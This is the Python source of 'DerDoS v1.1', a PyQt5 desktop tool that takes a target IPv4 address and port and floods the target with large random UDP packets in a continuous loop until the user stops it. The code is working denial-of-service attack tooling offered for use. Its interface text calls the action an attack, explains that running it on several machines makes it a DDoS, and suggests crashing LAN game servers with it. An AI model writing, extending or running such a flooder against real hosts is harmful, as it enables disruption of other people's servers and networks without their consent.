from PyQt5 import QtCore, QtGui, QtWidgets, QtTest
import socket
import os
import time
class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.setEnabled(True)
        MainWindow.resize(494, 278)
        MainWindow.setMinimumSize(QtCore.QSize(494, 278))
        MainWindow.setMaximumSize(QtCore.QSize(494, 278))
        MainWindow.setWindowTitle("DerDoS")
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("derdos_builder/asset/windows-logo.ico"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        MainWindow.setWindowIcon(icon)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.plainTextEdit = QtWidgets.QPlainTextEdit(self.centralwidget)
        self.plainTextEdit.setEnabled(False)
        self.plainTextEdit.setGeometry(QtCore.QRect(170, 10, 311, 211))
        self.plainTextEdit.setObjectName("plainTextEdit")
        self.attack = QtWidgets.QPushButton(self.centralwidget)
        self.attack.setGeometry(QtCore.QRect(10, 170, 141, 31))
        self.attack.setObjectName("attack")
        self.attack.setEnabled(True)
        self.stop = QtWidgets.QPushButton(self.centralwidget)
        self.stop.setGeometry(QtCore.QRect(10, 200, 141, 31))
        self.stop.setObjectName("stop")
        self.stop.setText("Stop")
        self.stop.setEnabled(False)
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(10, 230, 141, 21))
        self.label.setStyleSheet("font: 300 6pt \"Arial\";")
        self.label.setAlignment(QtCore.Qt.AlignCenter)
        self.label.setObjectName("label")
        self.progressBar = QtWidgets.QProgressBar(self.centralwidget)
        self.progressBar.setGeometry(QtCore.QRect(170, 231, 311, 20))
        self.progressBar.setProperty("value", 0)
        self.progressBar.setTextVisible(False)
        self.progressBar.setObjectName("progressBar")
        self.layoutWidget = QtWidgets.QWidget(self.centralwidget)
        self.layoutWidget.setGeometry(QtCore.QRect(10, 10, 144, 151))
        self.layoutWidget.setObjectName("layoutWidget")
        self.verticalLayout_4 = QtWidgets.QVBoxLayout(self.layoutWidget)
        self.verticalLayout_4.setContentsMargins(0, 0, 0, 0)
        self.verticalLayout_4.setObjectName("verticalLayout_4")
        self.verticalLayout_3 = QtWidgets.QVBoxLayout()
        self.verticalLayout_3.setObjectName("verticalLayout_3")
        self.title_ip = QtWidgets.QLabel(self.layoutWidget)
        self.title_ip.setStyleSheet("font: 500 14pt \"Arial\";")
        self.title_ip.setObjectName("title_ip")
        self.verticalLayout_3.addWidget(self.title_ip)
        self.ip = QtWidgets.QLineEdit(self.layoutWidget)
        self.ip.setObjectName("ip")
        self.verticalLayout_3.addWidget(self.ip)
        self.verticalLayout_4.addLayout(self.verticalLayout_3)
        self.verticalLayout = QtWidgets.QVBoxLayout()
        self.verticalLayout.setObjectName("verticalLayout")
        self.title_port = QtWidgets.QLabel(self.layoutWidget)
        self.title_port.setStyleSheet("font: 500 14pt \"Arial\";")
        self.title_port.setObjectName("title_port")
        self.verticalLayout.addWidget(self.title_port)
        self.port = QtWidgets.QLineEdit(self.layoutWidget)
        self.port.setText("")
        self.port.setObjectName("port")
        self.verticalLayout.addWidget(self.port)
        self.verticalLayout_4.addLayout(self.verticalLayout)
        MainWindow.setCentralWidget(self.centralwidget)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)
        self.actionMade_by_atomic09 = QtWidgets.QAction(MainWindow)
        self.actionMade_by_atomic09.setObjectName("actionMade_by_atomic09")
        self.plainTextEdit.setReadOnly(True)
        self.plainTextEdit.appendPlainText("Welcome to DerDoS v1.1\n")
        self.ip.setPlaceholderText("IPv4 Address")
        self.port.setPlaceholderText("Port")
        self.attack.clicked.connect(self.shoot)
        self.attack.clicked.connect(self.delay)
        self.attack.clicked.connect(self.attacking)
        self.stop.clicked.connect(self.stop_attack)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        self.attack.setText(_translate("MainWindow", "Attack"))
        self.label.setText(_translate("MainWindow", '<a href="https://github.com/ATOMIC09/DerDoS" style="text-decoration: none;">Made by atomic09 | v1.1</a>'))
        self.label.setOpenExternalLinks(True)
        self.title_ip.setText(_translate("MainWindow", "IP Address"))
        self.title_port.setText(_translate("MainWindow", "Port"))
        self.actionMade_by_atomic09.setText(_translate("MainWindow", '<a href="https://github.com/ATOMIC09/DerDoS" style="text-decoration: none;">V1.0 | Made by atomic09</a>'))

    def shoot(self):
        if self.ip.text() == "" or self.port.text() == "":
            self.plainTextEdit.appendPlainText("Please enter the IP Address and Port\n")
        else:
            self.ip.setReadOnly(True)
            self.port.setReadOnly(True)
            self.attack.setEnabled(False)
            self.stop.setEnabled(False)
            target_ip = str(self.ip.text())
            target_port = int(self.port.text())
            self.target_ip_global = target_ip
            self.target_port_global = target_port
            self.plainTextEdit.clear()
            self.plainTextEdit.appendPlainText(f"Attacking to {target_ip} with port {target_port}\n")
            self.plainTextEdit.appendPlainText(("1.This program requires Target's IPv4 and does not have a Firewall.\n2.This program sends data on the UDP protocol.\n3.If you do it on multiple computers, it's called DDoS.\n4.You can cause the local game server (LAN) to crash by DDoS on the game server host.\n\n **DDoS affects your internet bandwidth.**\n"))
            QtTest.QTest.qWait(2000)
            self.plainTextEdit.appendPlainText(('Hint: Please check "Send" on Network Adapter in Task Manager\n'))

    def delay(self, x):
        if x <= 100 and self.ip.text() != "" and self.port.text() != "":
            QtTest.QTest.qWait(10)
            self.progressBar.setValue(x)
            return self.delay(x+1)

    def attacking(self):
        if self.ip.text() != "" and self.port.text() != "":
            self.worker = WorkerThread(self)
            self.worker.target_ip = self.target_ip_global
            self.worker.target_port = self.target_port_global
            self.worker.start()
            self.stop.setEnabled(True)

    def stop_attack(self):
        if hasattr(self, 'worker'):
            self.worker.stop()
            self.progressBar.setProperty("value", 0)
            self.plainTextEdit.clear()
            self.plainTextEdit.appendPlainText("Welcome to DerDoS v1.1\n")
            self.ip.setReadOnly(False)
            self.port.setReadOnly(False)
            self.attack.setEnabled(True)
            self.stop.setEnabled(False)

class WorkerThread(QtCore.QThread):
    update_text_signal = QtCore.pyqtSignal(str)

    def __init__(self, ui_reference):
        super().__init__()
        self.ui_reference = ui_reference
        self.running = True
        self.update_text_signal.connect(self.ui_reference.plainTextEdit.appendPlainText)

    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(9216)  # Reduced packet size to prevent buffer overflow
            while self.running:  # Keep running until stopped by the user
                s.sendto(data, (self.target_ip, self.target_port))
                time.sleep(0.01)  # Optional: delay to prevent overwhelming the system
        except Exception as e:
            self.update_text_signal.emit(f"Error: {e}\n")
        finally:
            s.close()

    def stop(self):
        self.running = False
        self.quit()
        self.wait()

if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())
